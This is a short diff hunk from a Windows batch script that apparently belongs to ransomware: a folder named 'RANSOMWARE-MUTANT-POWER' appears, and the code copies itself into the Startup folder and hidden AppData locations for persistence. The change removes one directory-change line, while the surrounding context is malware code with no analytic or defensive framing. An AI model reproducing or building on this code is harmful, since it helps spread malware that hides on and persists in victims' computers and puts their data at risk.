@@ -217,7 +217,6 @@ xcopy clickme.bat "%userprofile%\AppData\Roaming\Microsoft\Windows\Start Menu\Pr
 xcopy /h /y clickme.bat "%userprofile%\AppData"
 chcp 949
 set backup=%cd%
-cd/
 if not %cd%==C:\ cd /d c:\
 del %userprofile%\AppData\RANSOMWARE-MUTANT-POWER\clickmevbso.vbs      
 ::Create clickme vbs.vbs in appdata
